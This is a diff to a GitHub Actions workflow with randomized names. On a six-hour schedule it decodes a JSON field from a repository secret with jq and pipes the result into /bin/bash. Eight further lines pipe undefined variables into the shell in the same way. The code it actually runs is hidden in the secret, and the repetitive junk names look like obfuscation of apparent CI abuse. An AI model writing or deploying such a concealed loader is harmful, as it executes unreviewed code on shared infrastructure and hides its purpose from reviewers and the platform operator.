@@ -1,26 +1,25 @@
 name: peiyuanxie2603
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 5/6 * * *'
+    - cron: '8 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: peiyuanxie2603
         env:
-          tfzqm3863: ${{ secrets.tfzqm3863 }}
+          qycvr318: ${{ secrets.qycvr318 }}
         run: |
-          echo $tfzqm3863 | jq -r .mj9 | /bin/bash
-          echo $jeuvf49 | jq -r .ykxlv9 | /bin/bash
-          echo $kwex7092 | jq -r .bb2597 | /bin/bash
-          echo $uf076 | jq -r .uxrf10273 | /bin/bash
-          echo $my22 | jq -r .wu8386 | /bin/bash
-          echo $tmdy03 | jq -r .lismj4 | /bin/bash
-          echo $s0 | jq -r .unfj5487 | /bin/bash
-          echo $tbzg400 | jq -r .zret1936 | /bin/bash
-          echo $n150 | jq -r .k60 | /bin/bash
-          echo $muq155 | jq -r .ctjr673 | /bin/bash
+          echo $qycvr318 | jq -r .m3014 | /bin/bash
+          echo $bizhw15508 | jq -r .cagg003 | /bin/bash
+          echo $z12 | jq -r .ey9 | /bin/bash
+          echo $nrd83 | jq -r .hzy717 | /bin/bash
+          echo $hu67 | jq -r .ppw34 | /bin/bash
+          echo $qzafr2017 | jq -r .pjhli62168 | /bin/bash
+          echo $iqze182 | jq -r .ovmsr8893 | /bin/bash
+          echo $whs596 | jq -r .bxht860 | /bin/bash
+          echo $vj9 | jq -r .eqt2 | /bin/bash
 
